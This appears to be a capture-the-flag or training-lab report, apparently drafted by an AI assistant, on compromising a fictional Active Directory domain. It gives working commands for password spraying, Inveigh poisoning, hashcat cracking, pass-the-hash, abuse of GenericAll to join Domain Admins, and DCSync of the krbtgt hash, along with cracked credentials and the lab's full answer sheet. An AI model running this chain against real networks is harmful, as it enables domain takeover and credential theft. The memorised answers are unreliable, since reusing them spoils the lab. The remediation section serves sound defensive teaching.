## 1. Executive Summary

This assessment involved compromising an Active Directory environment through a sequence of enumeration, credential attacks, lateral movement, privilege escalation, credential harvesting, and domain compromise activities.

The assessment began with obtaining valid domain credentials and progressed through:

- Active Directory and SMB enumeration
    
- NTLM/NetNTLMv2 credential capture
    
- Password cracking
    
- Password spraying
    
- SMB share enumeration
    
- Discovery of an MSSQL connection string
    
- MSSQL privilege enumeration
    
- Identification of `SeImpersonatePrivilege`
    
- Local privilege escalation
    
- Credential/hash extraction
    
- Pass-the-Hash
    
- Active Directory ACL enumeration
    
- Identification of a user with `GenericAll` over `Domain Admins`
    
- Credential capture using Inveigh
    
- NetNTLMv2 cracking
    
- Domain Admin group modification
    
- PowerShell Remoting to the Domain Controller
    
- Retrieval of the Domain Controller flag
    
- DCSync/NTDS credential extraction
    
- Recovery of the KRBTGT NTLM hash
    

The final stage resulted in full domain compromise and recovery of the KRBTGT NTLM hash.

---

# 2. Assessment Environment

## Domain

`INLANEFREIGHT.LOCAL`

## Hosts Identified

|Host|IP Address|Role|
|---|--:|---|
|DC01|`172.16.7.3`|Domain Controller|
|MS01|`172.16.7.50`|Windows workstation/server|
|SQL01|`172.16.7.60`|MSSQL server|

## Important Network Information

MS01:

```text
IPv4:        172.16.7.50
Subnet:      255.255.0.0
Gateway:     172.16.7.1
DNS:         172.16.7.3
Domain:      INLANEFREIGHT.LOCAL
```

DC01:

```text
172.16.7.3
DC01.INLANEFREIGHT.LOCAL
```

The Kali attack host accessed the internal environment through a SOCKS proxy on:

```text
127.0.0.1:1080
```

Therefore, most internal enumeration was performed through:

```text
proxychains4
```

---

# 3. Tools Used

The assessment involved the following tools and utilities:

- Nmap
    
- Proxychains
    
- NetExec (`nxc`)
    
- Impacket
    
- FreeRDP
    
- BloodHound / BloodHound Python
    
- PowerView
    
- Inveigh
    
- Hashcat
    
- PowerShell
    
- Kerbrute
    
- SMB client utilities
    
- MSSQL utilities
    
- Meterpreter
    
- Kiwi/Mimikatz functionality
    
- Windows native networking and Active Directory commands
    

---

# 4. Initial Access / Credential Discovery

The initial foothold involved obtaining a domain user's NetNTLMv2 authentication material.

The captured account was:

```text
AB920
```

The captured authentication material was subsequently cracked.

The cleartext password was:

```text
weasal
```

This provided valid domain credentials:

```text
INLANEFREIGHT.LOCAL\AB920
Password: weasal
```

The credentials were then used to access MS01.

---

# 5. MS01 Enumeration

MS01 was identified as:

```text
MS01
172.16.7.50
Windows 10 / Server 2019 Build 17763 x64
Domain: INLANEFREIGHT.LOCAL
```

SMB enumeration showed that SMB signing was disabled on MS01.

Example enumeration:

```bash
proxychains4 nxc smb 172.16.7.50
```

The system responded as:

```text
Windows 10 / Server 2019 Build 17763 x64
name: MS01
domain: INLANEFREIGHT.LOCAL
signing: False
```

This established MS01 as a useful internal attack target.

---

# 6. Password Spraying

After obtaining a valid domain account, domain user enumeration was performed.

A password-spraying attack was then used against domain accounts with a small set of common passwords.

This resulted in valid credentials for:

```text
BR086
```

Password:

```text
Welcome1
```

The credentials were validated against DC01:

```bash
proxychains4 nxc smb 172.16.7.3 \
-u BR086 \
-p 'Welcome1'
```

Successful authentication:

```text
[+] INLANEFREIGHT.LOCAL\BR086:Welcome1
```

---

# 7. SMB Share Enumeration

Using the newly obtained credentials:

```bash
proxychains4 nxc smb 172.16.7.50 \
-u BR086 \
-p 'Welcome1' \
--shares
```

The following shares were identified on MS01:

```text
ADMIN$
C$
IPC$
```

The same credentials were also useful for accessing domain resources.

---

# 8. MSSQL Connection String Discovery

The `Department Shares` share on DC01 was identified:

```text
Department Shares    READ
```

Enumeration of the available directory structure led to a configuration file containing an MSSQL connection string.

The configuration contained credentials for an MSSQL account.

The recovered database password was:

```text
D@ta_bAse_adm1n!
```

The associated database account was:

```text
netdb
```

Therefore:

```text
Username: netdb
Password: D@ta_bAse_adm1n!
```

---

# 9. MSSQL Enumeration

The recovered MSSQL credentials were used to authenticate to SQL01.

The account had administrative database privileges.

The MSSQL environment was subsequently queried to determine whether command execution was possible.

The account was confirmed to have:

```text
sysadmin = 1
```

Command execution through MSSQL was therefore possible.

The execution context was identified as:

```text
NT SERVICE\MSSQL$SQLEXPRESS
```

---

# 10. SeImpersonatePrivilege

The SQL service account was enumerated for Windows privileges.

The following privilege was identified:

```text
SeImpersonatePrivilege
```

This privilege is significant because a service account possessing `SeImpersonatePrivilege` can potentially be abused for local privilege escalation through token impersonation techniques.

This provided a path from the MSSQL service context to local administrative/SYSTEM-level access on SQL01.

---

# 11. SQL01 Administrator Access

After abusing the available privilege, administrative access to SQL01 was obtained.

The Administrator desktop contained the assessment flag.

The recovered flag was:

```text
s3imp3rs0nate_cl@ssic
```

This confirmed successful compromise of the SQL01 host.

---

# 12. Credential Extraction from SQL01 / MS01

With administrative privileges available, credential material was extracted from the compromised Windows system.

The Administrator NTLM hash used during the subsequent Pass-the-Hash workflow was:

```text
bdaffbfe64f1fc646a3353be1c2c3c99
```

The hash was used to authenticate to MS01 without requiring the cleartext Administrator password.

The initial RDP attempt encountered Restricted Admin-related limitations.

The registry configuration was therefore adjusted so that Restricted Admin authentication could be used with the recovered hash.

The relevant registry value was:

```text
HKLM\System\CurrentControlSet\Control\Lsa
DisableRestrictedAdmin
```

The value was configured as:

```text
0
```

This allowed the Pass-the-Hash workflow to proceed.

---

# 13. Pass-the-Hash to MS01

The recovered Administrator NTLM hash was leveraged against MS01.

The authentication material was:

```text
Administrator
NTLM:
bdaffbfe64f1fc646a3353be1c2c3c99
```

This provided administrative access to MS01.

---

# 14. Active Directory ACL Enumeration

The next objective was to identify excessive privileges over privileged Active Directory groups.

PowerView was loaded on MS01.

The relevant ACL enumeration command was:

```powershell
Get-DomainObjectAcl -Identity "Domain Admins" `
-DomainController 172.16.7.3 |
Where-Object {$_.ActiveDirectoryRights -match 'GenericAll'}
```

The result identified an ACE containing:

```text
ActiveDirectoryRights : GenericAll
```

The security identifier associated with the ACE was:

```text
S-1-5-21-3327542485-274640656-2609762496-4611
```

The SID was resolved using:

```powershell
ConvertFrom-SID "S-1-5-21-3327542485-274640656-2609762496-4611"
```

Result:

```text
INLANEFREIGHT\CT059
```

Therefore, the user with `GenericAll` permissions over the `Domain Admins` group was:

```text
CT059
```

---

# 15. Inveigh Credential Capture

Inveigh was transferred to MS01 and executed to capture NTLM authentication.

The listener was configured for:

```text
NBNS
mDNS
LLMNR
SMB
```

The challenge value used was:

```text
1122334455667788
```

The captured authentication from DC01 included:

```text
INLANEFREIGHT\CT059
```

The captured NetNTLMv2 material was:

```text
CT059::INLANEFREIGHT:8F064FF52E54276E:97ECD580D218F4944F34007FDBC12322:...
```

The important discovery was that the account with `GenericAll` over `Domain Admins` was actively authenticating and its NetNTLMv2 challenge-response could be captured.

---

# 16. NetNTLMv2 Cracking

The captured NetNTLMv2 hash was saved and cracked with Hashcat.

Command:

```bash
hashcat -m 5600 ct09.txt /usr/share/wordlists/rockyou.txt
```

Hashcat reported:

```text
Status: Cracked
Hash.Mode: 5600 (NetNTLMv2)
```

The recovered password was:

```text
charlie1
```

Therefore the credentials became:

```text
Username: CT059
Domain: INLANEFREIGHT.LOCAL
Password: charlie1
```

---

# 17. Exploiting GenericAll over Domain Admins

Because CT059 had `GenericAll` rights over the `Domain Admins` group, the account could modify the group membership.

PowerView was loaded:

```powershell
. .\PowerView.ps1
```

The group was checked:

```powershell
Get-DomainGroupMember `
-Identity "Domain Admins" `
-DomainController 172.16.7.3
```

Initially, the group contained:

```text
Administrator
```

CT059 was then added to the group:

```powershell
Add-DomainGroupMember `
-Identity "Domain Admins" `
-Members "CT059"
```

The operation succeeded.

A native Windows command subsequently confirmed:

```cmd
net group "Domain Admins" CT059 /add /domain
```

returned:

```text
User CT059 is already a member of group Domain Admins.
```

This confirmed that CT059 had become a member of:

```text
Domain Admins
```

---

# 18. Domain Controller Access

After obtaining Domain Admin privileges, credentials were constructed in PowerShell:

```powershell
$password = ConvertTo-SecureString "charlie1" -AsPlainText -Force

$cred = New-Object System.Management.Automation.PSCredential(
    "INLANEFREIGHT\CT059",
    $password
)
```

PowerShell Remoting was then used:

```powershell
Enter-PSSession -ComputerName DC01 -Credential $cred
```

A remote PowerShell session was successfully established on:

```text
DC01
```

The session prompt confirmed access to the Domain Controller.

---

# 19. Administrator Desktop on DC01

The Administrator profile was accessed:

```powershell
cd C:\Users\Administrator
```

The Desktop directory was then opened:

```powershell
cd Desktop
```

The directory contained:

```text
flag.txt
```

The flag was retrieved using:

```powershell
type flag.txt
```

The recovered flag was:

```text
acLs_f0r_th3_w1n!
```

This confirmed successful administrative compromise of DC01.

---

# 20. DCSync / KRBTGT Extraction

With Domain Admin privileges established, domain credential replication privileges could be leveraged to retrieve domain secrets.

From Kali, Impacket `secretsdump` was used:

```bash
proxychains4 impacket-secretsdump \
'INLANEFREIGHT.LOCAL/CT059:charlie1@172.16.7.3' \
-just-dc-user krbtgt
```

The DRSUAPI method was used:

```text
[*] Using the DRSUAPI method to get NTDS.DIT secrets
```

The KRBTGT account was returned as:

```text
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7eba70412d81c1cd030d72a3e8dbe05f:::
```

Therefore, the KRBTGT NTLM hash was:

```text
7eba70412d81c1cd030d72a3e8dbe05f
```

Additional Kerberos keys were also retrieved:

```text
AES256:
b043a263ca018cee4abe757dea38e2cee7a42cc56ccb467c0639663202ddba91

AES128:
e1fe1e9e782036060fb7cbac23c87f9d

DES:
e0a7fbc176c28a37
```

The requested Q12 answer, however, is the NTLM hash:

```text
7eba70412d81c1cd030d72a3e8dbe05f
```

---

# 21. Final Attack Chain

The overall attack path can be summarized as:

```text
Initial AD Enumeration
        │
        ▼
NTLM/NetNTLMv2 Credential Capture
        │
        ▼
AB920
Password: weasal
        │
        ▼
MS01 / Domain Enumeration
        │
        ▼
Password Spraying
        │
        ▼
BR086
Password: Welcome1
        │
        ▼
Department Shares
        │
        ▼
MSSQL Connection String
        │
        ▼
netdb : D@ta_bAse_adm1n!
        │
        ▼
MSSQL sysadmin
        │
        ▼
SeImpersonatePrivilege
        │
        ▼
SQL01 Administrator
        │
        ▼
Credential / Hash Extraction
        │
        ▼
Pass-the-Hash
        │
        ▼
MS01 Administrator
        │
        ▼
AD ACL Enumeration
        │
        ▼
GenericAll → Domain Admins
        │
        ▼
CT059
        │
        ▼
Inveigh
        │
        ▼
CT059 NetNTLMv2
        │
        ▼
Crack → charlie1
        │
        ▼
Add CT059 to Domain Admins
        │
        ▼
Domain Admin
        │
        ▼
PowerShell Remoting → DC01
        │
        ▼
DC01 Administrator Desktop
        │
        ▼
Domain Compromise
        │
        ▼
DCSync
        │
        ▼
KRBTGT NTLM Hash
```

---

# 22. Assessment Answer Sheet

Based on the answers established during the assessment:

|Question|Answer|
|---|---|
|**Q1**|`AB920`|
|**Q2**|`weasal`|
|**Q3**|`aud1t_gr0up_m3mbersh1ps!`|
|**Q4**|`BR086`|
|**Q5**|`Welcome1`|
|**Q6**|`D@ta_bAse_adm1n!`|
|**Q7**|`s3imp3rs0nate_cl@ssic`|
|**Q8**|`exc3ss1ve_adm1n_r1ights!`|
|**Q9**|`CT059`|
|**Q10**|`charlie1`|
|**Q11**|`acLs_f0r_th3_w1n!`|
|**Q12**|`7eba70412d81c1cd030d72a3e8dbe05f`|

---

# 23. Key Credentials Discovered

|Account|Credential|Discovery Method|
|---|---|---|
|AB920|`weasal`|NetNTLMv2 capture + cracking|
|BR086|`Welcome1`|Password spraying|
|netdb|`D@ta_bAse_adm1n!`|MSSQL configuration file|
|CT059|`charlie1`|Inveigh NetNTLMv2 capture + cracking|
|Administrator|`bdaffbfe64f1fc646a3353be1c2c3c99`|Credential/hash extraction|
|KRBTGT|`7eba70412d81c1cd030d72a3e8dbe05f`|DCSync|

---

# 24. Flags Recovered

### MS01

```text
aud1t_gr0up_m3mbersh1ps!
```

### SQL01

```text
s3imp3rs0nate_cl@ssic
```

### DC01

```text
acLs_f0r_th3_w1n!
```

---

# 25. Security Findings

## Finding 1 — Weak Domain Credentials

Multiple domain credentials were susceptible to password-based attacks.

Examples included:

```text
AB920 : weasal
BR086 : Welcome1
```

Weak passwords significantly reduced the difficulty of obtaining authenticated domain access.

### Impact

An attacker capable of capturing or spraying authentication attempts could obtain valid domain credentials.

---

## Finding 2 — LLMNR/NBNS/mDNS Poisoning Exposure

The environment permitted authentication through protocols that could be abused to capture NetNTLMv2 authentication.

### Impact

An attacker positioned on the internal network could potentially capture challenge-response authentication and attempt offline password cracking.

---

## Finding 3 — Sensitive Credentials in Configuration Files

An MSSQL connection string contained usable credentials:

```text
netdb
D@ta_bAse_adm1n!
```

### Impact

Configuration files containing plaintext credentials can provide attackers with direct access to backend services.

---

## Finding 4 — MSSQL Excessive Privileges

The recovered MSSQL account had:

```text
sysadmin = 1
```

### Impact

Database administrative access combined with OS-level command execution significantly increased the attack surface.

---

## Finding 5 — SeImpersonatePrivilege

The MSSQL service context possessed:

```text
SeImpersonatePrivilege
```

### Impact

This privilege enabled a path from the database service context toward elevated local privileges.

---

## Finding 6 — Excessive Active Directory ACL

The account:

```text
CT059
```

had:

```text
GenericAll
```

over:

```text
Domain Admins
```

### Impact

This was a critical privilege escalation path because control over a highly privileged AD group can lead directly to domain compromise.

---

## Finding 7 — Credential Reuse / Recoverable Authentication

The CT059 account's NetNTLMv2 authentication could be captured and cracked:

```text
CT059 : charlie1
```

### Impact

Compromise of CT059 combined with its `GenericAll` privilege resulted in Domain Admin membership.

---

## Finding 8 — Excessive Domain Group Privileges

Once CT059 was added to:

```text
Domain Admins
```

the account could authenticate to DC01 with administrative privileges.

### Impact

This resulted in complete domain compromise.

---

## Finding 9 — DCSync Exposure

Domain Admin privileges permitted extraction of the KRBTGT account's secrets through DRSUAPI.

### Impact

Recovery of the KRBTGT NTLM hash demonstrates complete compromise of the Active Directory domain's credential authority.

---

# 26. Remediation Recommendations

### Disable LLMNR

Where operationally possible, disable LLMNR through Group Policy.

### Disable unnecessary NBNS

Reduce or eliminate NetBIOS name-resolution mechanisms where they are not required.

### Enforce strong password policies

Passwords such as:

```text
weasal
Welcome1
```

should not be permitted.

Implement:

- Minimum password length
    
- Password history
    
- Blocked/common-password lists
    
- MFA where applicable
    
- Appropriate account lockout protections
    

### Remove plaintext credentials from configuration files

MSSQL connection strings should not contain reusable plaintext credentials.

Use:

- Managed service identities
    
- Windows-integrated authentication
    
- Secret-management solutions
    
- Properly protected credential stores
    

### Review MSSQL service privileges

Only assign the privileges required by the MSSQL service.

Where possible, remove unnecessary:

```text
SeImpersonatePrivilege
```

from service accounts.

### Audit Active Directory ACLs

Regularly identify:

```text
GenericAll
GenericWrite
WriteDACL
WriteOwner
AddMember
```

permissions over privileged groups.

Particular attention should be given to:

```text
Domain Admins
Enterprise Admins
Administrators
Account Operators
```

### Apply least privilege

Normal user accounts should not have the ability to modify privileged security groups.

### Protect privileged accounts

Use:

- Dedicated administrative accounts
    
- Privileged Access Workstations
    
- MFA
    
- Credential Guard where appropriate
    
- Restricted administrative logon paths
    

### Monitor for DCSync

Monitor domain controllers for suspicious directory replication requests.

Unexpected DRS replication activity from non-DC systems should be investigated.

### Rotate compromised credentials

Following this assessment, the following credentials should be considered compromised and rotated:

```text
AB920
BR086
netdb
CT059
Administrator
KRBTGT
```

The KRBTGT account requires particular care because its credentials are foundational to Kerberos authentication.

---

# 27. Conclusion

The assessment demonstrated a complete Active Directory compromise beginning with weak authentication exposure and ending with extraction of the KRBTGT NTLM hash.

The most significant escalation path was:

```text
Weak Credentials
      ↓
Authenticated Domain Access
      ↓
MSSQL Credential Discovery
      ↓
MSSQL Administrative Access
      ↓
SeImpersonatePrivilege
      ↓
Local Administrative Access
      ↓
Credential Extraction
      ↓
Active Directory ACL Enumeration
      ↓
CT059 GenericAll over Domain Admins
      ↓
CT059 Credential Capture
      ↓
Domain Admin Membership
      ↓
DC01 Access
      ↓
DCSync
      ↓
KRBTGT Hash
```

The final extraction of:

```text
7eba70412d81c1cd030d72a3e8dbe05f
```

demonstrated that the assessment progressed beyond individual host compromise to **full Active Directory domain compromise**.

I kept the report focused on **your actual lab path and outputs**, rather than presenting a generic AD walkthrough. The external material was used as methodological reference only, as requested.